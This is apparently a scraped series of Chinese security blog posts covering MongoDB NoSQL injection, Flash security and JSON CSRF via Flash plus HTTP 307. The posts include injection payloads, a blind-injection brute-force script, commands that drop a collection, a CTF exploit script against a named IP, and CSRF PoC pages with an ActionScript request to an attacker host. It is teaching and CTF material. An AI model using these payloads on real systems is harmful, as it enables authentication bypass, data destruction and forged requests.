array( 'username' =&gt; $_REQUEST['username'], 'password' =&gt; $_REQUEST['password'] ); $cursor = $collection-&gt;find($data); $string = json_encode($data); // echo $string.'&lt;br&gt;'; $count = $cursor-&gt;count(); $doc_failed = new DOMDocument(); $doc_failed-&gt;loadHTMLFile(\"failed.html\"); $doc_succeed = new DOMDocument(); $doc_succeed-&gt;loadHTMLFile(\"succeed.html\"); if($count &gt;0 )&#123; echo $doc_succeed-&gt;saveHTML(); foreach ($cursor as $user)&#123; echo 'Welcome! '.$user['username'].\"&lt;/br&gt;\"; &#125; &#125; else&#123; echo $doc_failed-&gt;saveHTML(); &#125;?&gt; 访问界面： 随便输入用户账号密码登录之后，显示登录错误： 我们可以$ne来进行重言式注入来绕过登录认证逻辑，可以看到成功登录： ?username[$ne]=test&amp;password[$ne]=test 虽然前面成功绕过登录校验，显示了所有用户名，但如果我们想知道管理员用户admin的密码具体为多少时，此时就需要使用$regex匹配盲注来获取： ?username=admin&amp;password[$regex]=^I 写个脚本跑一下就出来了： 123456789101112131415161718192021&lt;?php$ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://127.0.0.1/NoSQLInjectionAttackDemo/login/login.php');curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);$ori = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';$str = '';for ($i = 0; $i &lt;10 ; $i++) &#123; for ($j = 0; $j &lt; strlen($ori); $j++) &#123; $post = 'username=admin&amp;password[$regex]=^'.$str.$ori[$j]; curl_setopt($ch,CURLOPT_POSTFIELDS,$post); $data = curl_exec($ch); // echo $ori[$j].':'.strlen($data).'&lt;br&gt;'; if (strlen($data) == 297) &#123; $str .= $ori[$j]; echo $str.\"&lt;br&gt;\"; break; &#125; &#125;&#125;?&gt; MongoDB Shell注入MongoDB Shell注入，主要是使用execute()/executeCommand()方法执行拼接的MongoDB命令语句导致的。 execute()方法正和前面联合查询注入一样，这里说下executeCommand()方法的情景，因为这是MongoDB新版本的写法： 123456789101112131415&lt;?php$manager = new MongoDB\\Driver\\Manager('mongodb://mongo:27017');$username = $_GET['username'];$cmd = new MongoDB\\Driver\\Command([ 'eval'=&gt; \"db.users.distinct('username',&#123;'username':'$username'&#125;)\"]);$cursor = $manager-&gt;executeCommand('test', $cmd)-&gt;toArray();var_dump($cursor);if(count($cursor)&gt;0)&#123; echo 'Succeed!';&#125;else&#123; echo 'Failed!';&#125;?&gt; 在数据库中建立users集合，初始化一条用户数据如下： 123456&gt; db.users.find().pretty()&#123; &quot;_id&quot; : ObjectId(&quot;5d56b8469cea49dc4479cd6b&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot;&#125; 正常访问： Shell注入插入文档往users集合插入攻击者用户： ?username=1&#39;});db.users.insert({&quot;username&quot;:&quot;mi1k7ea&quot;,&quot;password&quot;:&quot;hacker&quot;});db.users.find({&#39;username&#39;:&#39;2 到后台连接MongoDB查看，确实插入数据了： 1234567891011&gt; db.users.find().pretty()&#123; &quot;_id&quot; : ObjectId(&quot;5d56b8469cea49dc4479cd6b&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot;&#125;&#123; &quot;_id&quot; : ObjectId(&quot;5d56bb6812a5a3b11fddcc3e&quot;), &quot;username&quot; : &quot;mi1k7ea&quot;, &quot;password&quot; : &quot;hacker&quot;&#125; Shell注入删除集合搞点破坏，删掉users集合： ?username=1&#39;});db.users.drop();db.users.find({&#39;username&#39;:&#39;2 到后台连接MongoDB查看的时候已经不存在users集合了。 0x05 Node.js MongoDB注入攻击原理都差不多，这里就简单搞下Demo看看。 这里我用的是：https://github.com/bibotai/research_of_nosql_injection/tree/master/jsdemo 除此之外，还可参考更完整的Demo：https://github.com/ricardojoserf/NoSQL-injection-example 下载下来后，输入运行Node.js： 123cd jsdemonpm installnode index.js index.js中关键JS代码如下，取请求体中Json格式的username和password键值作为从参数调用findOne()实现查询操作： 1234567891011121314app.post('/', function(req, res) &#123; console.log(req.body) User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123; console.log(user) if (err) &#123; return res.render('index', &#123;message: err.message&#125;); &#125; if (!user) &#123; return res.render('index', &#123;message: 'Sorry!'&#125;); &#125; return res.render('index', &#123;message: 'Welcome back ' + user.name + '!!!'&#125;); &#125;);&#125;); 这里利用重言式注入即可绕过登录认证： 0x06 Java MongoDB注入攻击都差不多，环境搭建可参考： https://github.com/aaoraa/nosql-injection-sample https://github.com/shirishp/NoSQLInjectionDemo 0x07 题目——NopeSQL这里看下CyBRICS CTF Quals 2019的NopeSQL题目：http://173.199.118.226/index.php 打开是个提交用户名和密码的表单的界面： 先是拿sqlmap跑，发现没跑出啥名堂，结合题目名称推测应该是考察NoSQL注入知识，而NoSQL注入在CTF中一般是考察MongoDB注入攻击，除非是很简单的题目，不然一般是需要代码审计来进行构造注入的。 于是一番尝试，访问http://173.199.118.226/.git/HEAD会下载内容，说明存在.git源码泄露： 直接上lijiejie的神器GitHack下载解析源码文件： 下面就开始代码审计。 其实就只有一个index.php文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phprequire_once __DIR__ . \"/vendor/autoload.php\";function auth($username, $password) &#123; $collection = (new MongoDB\\Client('mongodb://localhost:27017/'))-&gt;test-&gt;users; $raw_query = '&#123;\"username\": \"'.$username.'\", \"password\": \"'.$password.'\"&#125;'; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125;$user = false;if (isset($_COOKIE['username']) &amp;&amp; isset($_COOKIE['password'])) &#123; $user = auth($_COOKIE['username'], $_COOKIE['password']);&#125;if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; $user = auth($_POST['username'], $_POST['password']); if ($user) &#123; setcookie('username', $_POST['username']); setcookie('password', $_POST['password']); &#125;&#125;?&gt;&lt;?php if ($user == true): ?&gt; Welcome! &lt;div&gt; Group most common news by &lt;a href=\"?filter=$category\"&gt;category&lt;/a&gt; | &lt;a href=\"?filter=$public\"&gt;publicity&lt;/a&gt;&lt;br&gt; &lt;/div&gt; &lt;?php $filter = $_GET['filter']; $collection = (new MongoDB\\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $pipeline = [ ['$group' =&gt; ['_id' =&gt; '$category', 'count' =&gt; ['$sum' =&gt; 1]]], ['$sort' =&gt; ['count' =&gt; -1]], ['$limit' =&gt; 5], ]; $filters = [ ['$project' =&gt; ['category' =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline)); ?&gt; &lt;?php if (isset($filter)): ?&gt; &lt;?php foreach ($cursor as $category) &#123; printf(\"%s has %d news&lt;br&gt;\", $category['_id'], $category['count']); &#125; ?&gt; &lt;?php endif; ?&gt;&lt;?php else: ?&gt; &lt;?php if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])): ?&gt; Invalid username or password &lt;?php endif; ?&gt; &lt;form action='/' method=\"POST\"&gt; &lt;input type=\"text\" name=\"username\"&gt; &lt;input type=\"password\" name=\"password\"&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;h2&gt;News&lt;/h2&gt; &lt;?php $collection = (new MongoDB\\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $cursor = $collection-&gt;find(['public' =&gt; 1]); foreach ($cursor as $news) &#123; printf(\"%s&lt;br&gt;\", $news['title']); &#125; ?&gt;&lt;?php endif; ?&gt; 我们拆分来看，分为两块逻辑，第一部分的逻辑是登录，定义了auth()函数来认证登录： 123456789101112131415161718192021222324252627&lt;?phprequire_once __DIR__ . \"/vendor/autoload.php\";function auth($username, $password) &#123; $collection = (new MongoDB\\Client('mongodb://localhost:27017/'))-&gt;test-&gt;users; $raw_query = '&#123;\"username\": \"'.$username.'\", \"password\": \"'.$password.'\"&#125;'; $document = $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125;$user = false;if (isset($_COOKIE['username']) &amp;&amp; isset($_COOKIE['password'])) &#123; $user = auth($_COOKIE['username'], $_COOKIE['password']);&#125;if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; $user = auth($_POST['username'], $_POST['password']); if ($user) &#123; setcookie('username', $_POST['username']); setcookie('password', $_POST['password']); &#125;&#125;?&gt; 可以看到，以POST方式提交登录表单参数，然后直接拼接到Json格式的数组中，经过json_decode()处理后传入findOne()函数中执行查询操作，若存在则设置Cookie。 构造的关键在于json_decode()，如果没有该函数处理还可以使用PHP数组注入的方式来注入如username=admin&amp;password[$ne]=1来绕过，但这里由于json_decode()的存在而不行，利用点在于该函数会给变量赋最后一次赋值的值，我们可以本地试下： 1234567&lt;?php$username = '1';$password = '\",\"password\":&#123;\"$ne\":null&#125;,\"username\":\"admin';$json = '&#123;\"username\": \"'.$username.'\", \"password\": \"'.$password.'\"&#125;';$obj = json_decode($json);print(\"username is \".$obj-&gt;&#123;\"username\"&#125;);?&gt; 输出结果为：“username is admin”。 知道这个特性，我们就可以构造如下payload绕过登录认证： username=1&amp;password=&quot;,&quot;password&quot;:{&quot;$ne&quot;:null},&quot;username&quot;:&quot;admin 当点击category链接的时候，传入filter参数值$category，显示出来包括flags文章的标题名等内容： 当点击publicity链接的时候，传入filter参数值$public： 登录认证绕过之后，再看下第二部分的代码逻辑： 123456789101112131415161718192021222324252627&lt;?php $filter = $_GET['filter']; $collection = (new MongoDB\\Client('mongodb://localhost:27017/'))-&gt;test-&gt;news; $pipeline = [ ['$group' =&gt; ['_id' =&gt; '$category', 'count' =&gt; ['$sum' =&gt; 1]]], ['$sort' =&gt; ['count' =&gt; -1]], ['$limit' =&gt; 5], ]; $filters = [ ['$project' =&gt; ['category' =&gt; $filter]] ]; $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));?&gt;&lt;?php if (isset($filter)): ?&gt; &lt;?php foreach ($cursor as $category) &#123; printf(\"%s has %d news&lt;br&gt;\", $category['_id'], $category['count']); &#125; ?&gt;&lt;?php endif; ?&gt; 接收filter参数，然后调用MongoDB聚合函数aggregate()来处理数据，其中限制了显示数为5。我们看下传入参数filter的调用过程：_id =&gt; \\$category =&gt; \\$filter，并在后面通过\\$category[‘_id’]输出出来，其中输出语句中的\\$category为集合数组中的元素。也就是说，我们输入的filter内容会输出的页面上。 下面就涉及到MongoDB的知识点了。 在使用aggregate()聚合函数时，在里面是可以使用条件判断语句的。在MongoDB中\\$cond表示if判断语句，匹配的符号使用\\$eq，连起来为[$cond][if][$eq]，当使用多个判断条件时重复该语句即可。官网的例子是这样的： 1234567891011121314db.inventory.aggregate( [ &#123; $project: &#123; item: 1, category: &#123; $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125; &#125; &#125; &#125; ]) 那么就可以参考着构造语句了。由前面知道当提交?filter=\\$category时会出现flags字样，那么就可以在if判断条件中设置当前\\$category的值是否为flags，当为flags时输出\\$title内容（从源码中可看出集合含有\\$title属性），否则原样输出\\$category。最后整个构造结构如下： 123456789101112131415db.news.aggregate( [ &#123; $project: &#123; category: &#123; $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, then: $title, else: $category &#125; &#125; &#125; &#125; ]) 转换成PHP数组形式传入filter参数： ?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category 可以看到，原本输出\\$category值为flags的地方替换了为flags对应的\\$title值，说是这时一个flag文本。以此推测，该集合应该还存在一个text的属性，接着直接修改\\$title为\\$text查看： ?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category 可以看到，该集合确实存在text属性，且该值即为flag。 当然有利用脚本，原理都一样： 123456789101112131415import requestss = requests.Session()data = &#123; 'username':'admin', 'password':'\",\"password\":&#123;\"$ne\":null&#125;,\"username\":\"admin'&#125;#loginresponse = s.post('http://173.199.118.226/index.php', data=data)#flagresponse = s.post('http://173.199.118.226/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12', data=data)print(bytes(response.content).decode()) 0x08 防御对于外部输入拼接查询语句的内容，对特殊字符进行严格的过滤或转移，如$符； 对于JavaScript注入，$where和Command方法能不用就尽量不用； 0x09 工具Github上有个叫NoSQLAttack工具，具体的参考：https://github.com/youngyangyang04/NoSQLAttack 0x0A 参考Mongodb注入攻击 冷门知识 — NoSQL注入知多少 CyBRICS-CTF-Quals-2019-Web-Writeup","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.mi1k7ea.com/tags/SQL注入/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://www.mi1k7ea.com/tags/MongoDB/"}]},{"title":"Flash安全总结","date":"2019-08-10T01:58:03.000Z","path":"2019/08/10/Flash安全总结/","text":"0x01 Flash简介Adobe Flash是一种交互式矢量多媒体技术，被广泛应用于Web网站中，以增加特殊的动画效果和网页交互能力。 Flash Player与SWF要想运行Flash程序，浏览器中必须安装Flash Player或Shockwave Player。 Flash Player是一款多媒体程序播放器，能够在各种浏览器、OS和移动设备上使用，兼容性高，应用广泛。 SWF（Shock Ware Flash）是Flash的专用格式，使用Flash Player即可运行SWF文件。此外，SWF文件可以直接嵌入到网页中去执行。 浏览器中SWF解释器如图： 可看到浏览器运行Flash应用程序的步骤： 浏览器解析HTML页面； 解析嵌入的Flash插件； Flash插件解析SWF字节码； 插件和浏览器通过LiveConnect接口进行交互； ActionScript语言ActionScript（简称AS）是由Macromedia（现已被Adobe收购）为其Flash产品开发的 ，最初是一种简单的脚本语言，现在最新版本ActionScript3.0，是一种完全的面向对象的编程语言，功能强大，类库丰富，语法类似JavaScript，多用于Flash互动性、娱乐性、实用性开发，网页制作和RIA（丰富互联网程序）开发。 目前，网上大多数Flash都是应用ActionScript2或ActionScript3来编写的。 一般是使用Adobe Flash CS系列的软件直接进行AS代码的编写和编译。 SWF文件编译与反编译具体可参考之前的博文：https://www.mi1k7ea.com/2019/07/21/Flash%E5%9E%8BXSS%E5%B0%8F%E7%BB%93/#swf%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91 嵌入Flash文件在HTML页面中嵌入Flash，一般使用object和embed标签。 （1）使用embed标签： 1&lt;embed src=\"filename.swf\" width=\"200\" height=\"100\" type=\"application/x-shockwave-flash\" /&gt; embed标签支持Mozilla系列的浏览器或其他支持Netscape插件的浏览器，IE也能识别。 （2）使用object标签： IE下嵌入： 12345&lt;object codeBase=\"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"&gt;&lt;param name=\"movie\" value = \"http://example.com/exp.swf\" /&gt;&lt;param name=\"allowScriptAccess\" value=\"always\" /&gt;&lt;param name=\"allowNetworking\" value=\"all\" /&gt;&lt;/object&gt; 非IE下嵌入（IE8能成功，本地最新IE11也OK）： 12345&lt;object type=\"application/x-shockwave-Flash\" data=\"./exp.swf\"&gt;&lt;param name=\"movie\" value = \"./exp.swf\" /&gt;&lt;param name=\"allowScriptAccess\" value=\"always\" /&gt;&lt;param name=\"allowNetworking\" value=\"all\" /&gt;&lt;/object&gt; object标签用于引入对象，如图像、音频、视频、Java Applets、ActiveX、PDF以及Flash，用于IE系列或其他支持ActiveX控件的浏览器。 （3）使用object+embed标签： 12345&lt;object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0\" width=\"200\" height=\"100\"&gt; &lt;param name=\"movie\" value=\"filename.swf\"&gt; &lt;param name=\"wmode\" value=\"transparent\"&gt; &lt;embed src=\"filename.swf\" width=\"200\" height=\"100\" type=\"application/x-shockwave-flash\" /&gt; &lt;/object&gt; 为了确保大多数浏览器能正常显示Flash，建议把embed标签嵌套放在object标签内。 0x02 Flash安全模型随着Flash功能越来越丰富，使用越来越广泛，导致Flash的安全问题也越来越多，因此就诞生了Flash安全模型，其主要提供以下几个方面的功能： 利用沙箱控制和阻止外部Flash之间的交互和访问； 控制浏览器和Flash之间的交互和访问； 控制其他外部资源的访问； 控制对其他服务器的通信； Flash安全沙箱Flash安全模型使用沙箱来定义各个Flash应用程序可以访问的数据以及操作的范围。 看图理解下： 安全域是Flash中最顶级的沙箱，安全域链接到内容的来源域名，比如a.com下的SWF文件包含一个链接到a.com的安全域，而b.com下的SWF文件则有一个链接到b.com的安全域。不同的安全域使得SWF文件在Flash Player中播放时运行在自身的沙箱下； 如果两个SWF文件分别处于不同的安全域，则任何一个SWF中的数据都不可以被另一个SWF获取，如a1.swf只能与同域下的a2.swf文件通信，b1.swf只能与同域下的b2.swf文件通信，若尝试获取其他域的SWF文件则会报错； 若想让两个处于不同安全域下的SWF文件通信，可以通过授权来实现。通过授权后，某个安全域内的文件即可获取另一个域内的文件数据。在AS中，SWF文件的授权是通过Security.allowDomain()函数来设置的，这个方法是应用于swf文件跨域加载swf文件并访问其内部属性、方法、类等的场景。 HTML参数权限机制API 在HTML页面嵌入Flash时，其中的Object和Embed标签都有allowScriptAccess参数和allowNetworking参数，主要是用于在HTML页面调用执行Flash文件的场景。 allowScriptAccess：控制html页面与Flash页面的通讯。 always：html和Flash页面的通讯不做任何的限制； samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】； never：html和Flash禁止通讯。 allowNetworking：控制Flash与外部的网络通讯。 all：Flash所有的网络API通讯接口都可用； internal：navigateToURL，fscommand，ExternalInterface.call不可用； none：所有的网络API不可用。 allowScriptAccess和allowNetworking实际是Flash权限机制的API，前面提过的Security.allowDomain()函数也是其中的一个。allowScriptAccess和allowNetworking都属于HTML参数权限机制API。 Cross Domain Policy如图描述： 默认情况下，在浏览器中运行的Flash程序是不允许访问其他域的数据的。为了解决这个问题，唯一方式就是跨域策略文件crossdomain.xml，其是放置在网站的Web根目录下，而该文件的内容必须遵从XML格式，如上图示例。 crossdomain.xml文件主要包含如下几个节点： site-control：通过检查该节点的属性值，确认是否可以允许加载其他策略文件； allow-access-from：通过检查该节点的domain属性值，确认是否为允许访问的域名； allow-access-from-identity：配置跨域访问策略为允许有特定证书的来源跨域访问本域上的资源； allow-http-request-headers-from：授权第三方域的Flash向本域发送用户定义的HTTP头； 常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。 默认情况下，Flash不加载除主策略文件之外的其他策略文件，但是设置了permitted-cross-domain-policies的by-content-type相关属性后，黑客就能通过上传文件来定义自己的策略文件。 设置管理器在本地硬盘运行的SWF文件也有自己的安全域，可以通过Flash Player的设备管理器来设置。设备管理器允许用户为客户端PC上执行的Flash程序制定各种安全性、隐私和资源使用设置。 通过Flash Player设置管理器，可以管理全局保密性设置、存储设置、安全设置和自动通知设置等。 0x03 Flash XSSFlash XSS主要有以下两种方式： 与JavaScript通信引发的XSS； 加载第三方资源引发的XSS（如SWF文件或XML文件）； 具体的原理和攻击利用可参考：Flash型XSS总结 0x04 Flash CSRFFlash CSRF在于：如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。 具体的原理和攻击利用可参考：Flash型CSRF总结 0x05 XSFXSF（Cross Site Flash）跨站Flash攻击，就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件，这样就有可能造成XSF攻击，情况分为以下两种： 当一个Flash文件调用某个函数如loadMovie()加载其他域的Flash文件时； 当HTML页面使用*Script去加载解析一个Flash文件时； 以下函数如果使用不当就很容易产生XSF问题： 123456789loadVariables()loadMovie()loadMovieNum()FScrollPane.loadScrollContent()LoadVars.send()XML.load(&apos;URL&apos;)LoadVars.load(&apos;url&apos;)Sound.loadSound(&apos;url&apos;)NetStream.play(&apos;url&apos;) 通过这些恶意接口，可以指定URL为我们构造的恶意文件如swf或xml文件，从而在目标网站实现JS攻击。 漏洞示例代码如图，_root是AS2参数传递的关键字，这里loadMovieNum()函数参数可由外部传入，导致可以在URL栏输入参数来加载攻击者的恶意SWF文件，造成XSF攻击： 0x06 FPIFPI（Flash Parameter Injection）Flash参数型注入攻击，是一种动态注入Flash的全局参数的攻击技巧。 网页中的Flash是直接嵌入到HTML中的，因此不能被URI加载，但由于Flash的一些全局参数是可以通过URI的方式来设置的，因此如果攻击者能访问和控制值Flash的全局参数，就能进行Flash XSS和XSF等攻击了。 反射型FPI和反射型XSS类似，攻击者可以通过外部输入参数来传入恶意内容，而传入的参数直接拼接到了生成HTML页面的代码中，造成反射型FPI。 在下面的代码中，Flash视频的名称是从请求的表单或URL参数获取的，并且被放在了生成HTML页面中，攻击者可能通过下面的URL覆盖一些Flash全局参数： 附带FlashVars的反射型FPI这种方式使用FlashVars属性，该属性可以在object标签中指定，用来传递全局Flash参数。在AS2中，FlashVars会被自动导入到Flash程序的变量空间。当FlashVars属性可由外部控制时，存在反射型FPI。 漏洞示例代码如图，其中%26为&amp;的URL编码： FlashVars注入当任意的object标签的属性作为参数接收时，都可能会导致这种攻击。 漏洞示例代码如图，width参数未经过过滤，直接传递到输出的HTML页面中，导致了攻击者可以注入FlashVars： DOM型FPI当document.location变量被用作Flash参数的时候，会导致此类攻击。 漏洞示例代码如图，这里有两个变量传递给Flash，一个是location、值为http://host/index.htm，另一个是globalVar、值为evil： 0x07 伪造HTTP头可以使用ActionScript编写伪造HTTP头字段的请求，将该as代码编译成swf文件然后诱使用户访问导致CSRF或攻击者自己某些情况下伪造HTTP头字段进行发包都是OK的： 0x08 Flash钓鱼这里并非是Flash本身的漏洞利用，而是将Flash作为钓鱼攻击的一种载体进行利用，因此这里不多说，具体可见：https://book.2cto.com/201310/34314.html。 0x09 Flash安全测试工具OWASP推荐了一款名为SWFIntruder的测试工具，具体可参见OWASP链接：https://www.owasp.org/index.php/Category:SWFIntruder 0x0A 参考FLASH_Security_OWASP 《XSS跨站脚本攻击剖析与防御》","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Flash","slug":"Flash","permalink":"https://www.mi1k7ea.com/tags/Flash/"}]},{"title":"利用Flash进行Json CSRF攻击","date":"2019-08-05T13:47:34.000Z","path":"2019/08/05/利用Flash进行Json-CSRF攻击/","text":"这时很早以前的话题了，整理一下原理和工具脚本等，以作为笔记。 0x01 CSRF与Json CSRF一般的，我们说CSRF都是在GET/POST请求中通过构造HTML表单如param=value来提交给服务器，服务器得到数据并处理请求；而Json CSRF则是提交Json格式的数据。 相比之下，提交Json格式的数据，这种请求包更难构造，因为表单无法伪造Content-Type字段、无法提交格式正确的Json数据，因此需要利用其它技术组合利用。 当然，两者的漏洞存在的前提是一样的，即无CSRF token。 0x02 Json CSRF的几种情形未校验Content-Type字段和Json数据格式此时直接使用Burpsuite生成的CSRF PoC即可利用，这里我们可以明显地看到Json数据最后会带上=号，因此也正是服务端未校验Json数据格式才能成功。 这里假设某站点Json端点通过POST方式提交Json数据，该接口用于添加新用户和邮箱，我们用Burpsuite抓包然后生成PoC如下，当然实际生成的情况中提交数据的特殊字符会被编码掉： 12345678910&lt;html&gt;&lt;title&gt;JSON CSRF POC&lt;/title&gt;&lt;center&gt;&lt;h1&gt; JSON CSRF POC &lt;/h1&gt;&lt;form action=http://vul-app.com method=post enctype=\"text/plain\" &gt;&lt;input name='&#123;\"name\":\"attacker\",\"email\":\"attacker@gmail.com\",\"ignore_me\":\"test\"&#125;' value=''type='hidden'&gt;&lt;input type=submit value=\"Submit\"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/html&gt; 而发送的POST请求包大致如下： 1234567POST / HTTP/1.1Host: vul-app.com...Content-Type: text/plain...&#123;&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker@gmail.com&quot;,&quot;ignore_me&quot;:&quot;test&quot;&#125;= 可以看到，Content-Type字段为text/plain，Json数据最后会多出个=号，那是因为Json数据放在了input标签中name属性值中，而input标签的value属性为空，表单提交时是会以name=value的形式提交的。 缺点：无法伪造Content-Type字段；不校验Json数据格式。 未校验Content-Type字段，校验Json数据格式但最后的Json键值可填入=号此时需要稍微改下前面的表单PoC，在input标签的value处写上相应的值来使Json数据格式正确： 12345678910&lt;html&gt;&lt;title&gt;JSON CSRF POC&lt;/title&gt;&lt;center&gt;&lt;h1&gt; JSON CSRF POC &lt;/h1&gt;&lt;form action=http://vul-app.com method=post enctype=\"text/plain\" &gt;&lt;input name='&#123;\"name\":\"attacker\",\"email\":\"attacker@gmail.com\",\"ignore_me\":\"' value='test\"&#125;'type='hidden'&gt;&lt;input type=submit value=\"Submit\"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/html&gt; 在POST的请求体中，看到Content-Type字段依然为text/plain，但Json数据最后并无=号，而是在Json数据中最后的键值对的值中前面多了个=号，这时闭合构造的结果： 缺点：无法伪造Content-Type字段；Json数据值可带=号。 校验Content-Type字段和Json数据格式，允许跨域OPTIONS如果校验了Content-Type字段必须为application/json的话，前面两种方式都不行了。 当跨域请求为复杂请求时，浏览器会发送OPTIONS请求，用来让服务端返回允许的方法（如GET、POST），允许被跨域访问的Origin（来源或者域），还有是否需要Credentials（认证信息）等。 下面使用Fetch和XHR方法的前提都是要发起OPTIONS请求来进行预检，之后才是真正地发送Json数据包。 Fetch 使用JS的Fetch()方法可以解决Content-Type字段的问题： 12345&lt;html&gt; &lt;script&gt; fetch('http://vul-app.com', &#123;method: 'POST', credentials: 'include', headers: &#123;'Content-Type': 'application/json; charset=utf-8'&#125;, body: '&#123;\"name\":\"attacker\",\"email\":\"attacker@gmail.com\",\"ignore_me\":\"test\"&#125;'&#125;);&lt;/script&gt;&lt;/html&gt; 抓包可看到会先发送OPTIONS请求，再发送真正的请求；在请求中Content-Type字段为application/json，Json数据也是正确的格式。 缺点：跨域发送OPTIONS请求。 XHR 使用XMLHttpRequest可以解决Content-Type字段的问题： 12345678910111213141516171819&lt;html&gt; &lt;body&gt; &lt;script&gt; function submitRequest()&#123; var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://vul-app.com\", true); xhr.setRequestHeader(\"Accept\", \"*/*\"); xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\"); xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=utf-8\"); xhr.withCredentials = true; //携带cookie xhr.send(JSON.stringify(&#123;\"name\":\"attacker\",\"email\":\"attacker@gmail.com\",\"ignore_me\":\"test\"&#125;)); &#125;&lt;/script&gt; &lt;/body&gt; &lt;form action=\"#\"&gt; &lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\"/&gt; &lt;/form&gt;&lt;/html&gt; 抓包可看到会先发送OPTIONS请求，再发送真正的请求；在请求中Content-Type字段为application/json，Json数据也是正确的格式。 缺点：跨域发送OPTIONS请求。 校验Content-Type字段和Json数据格式此时便需要用到Flash + HTTP 307技巧来实现利用了，在下一节说明。 0x03 Flash + HTTP 307个人理解的公式：无CSRF token + Flash + HTTP 307 = Json CSRF 解决了哪些问题： Flash可以自定义Header请求，从而伪造Content-Type字段； HTTP 307和其他3xx HTTP状态码不同之处在于，307可以确保重定向请求发送之后，请求的方法和请求主体不会发生任何改变，会原封不动地转发出去； Flash访问同域或存在crossdomain.xml允许的服务器的307跳转文件可避免Flash跨域访问时必须要求目标站点存在crossdomain.xml且配置允许的特定情况； 适用场景目标Json端点无CSRF token机制，其所能接收的Header的Content-Type必须为application/json，且严格校验了Json格式数据。 关键文件在发起攻击前，需要我们准备好几个关键的文件。 Flash文件 第一个是用于向307文件发起请求的诱使用户访问的Flash的swf文件，作用就是构造Json数据，伪造Content-Type字段并访问攻击者控制的服务器的307文件，至于as文件如何编译看下Flash XSS相关文章即可： 12345678910111213141516171819202122232425262728293031323334353637383940package&#123; import flash.display.Sprite; import flash.net.URLLoader; import flash.net.URLRequest; import flash.net.URLRequestHeader; import flash.net.URLRequestMethod;public class csrf extends Sprite &#123; public function csrf() &#123; super(); var member1:Object = null; var myJson:String = null; member1 = new Object(); member1 = &#123; &quot;acctnum&quot;:&quot;100&quot;, &quot;confirm&quot;:&quot;true&quot; &#125;; var myData:Object = member1; myJson = JSON.stringify(myData); var url:String = &quot;http://attacker-ip:8000/&quot;; var request:URLRequest = new URLRequest(url); request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;)); request.data = myJson; request.method = URLRequestMethod.POST; var urlLoader:URLLoader = new URLLoader();try &#123; urlLoader.load(request); return; &#125; catch(e:Error) &#123; trace(e); return; &#125; &#125; &#125;&#125; 实现307跳转功能的文件 该文件放置于攻击者控制的服务器上，可与Flash文件放置在同一服务上，可用PHP或Python实现。 PHP实现307跳转的代码，简单粗暴： 123&lt;?phpheader(\"Location: \".$_GET[\"endpoint\"], true, 307);?&gt; Python实现的代码，基于BaseHTTPServer实现的，用于和Flash文件放置在同一个Web服务： 123456789101112131415161718192021222324252627282930313233import BaseHTTPServerimport timeimport sysHOST = '' PORT = 8000class 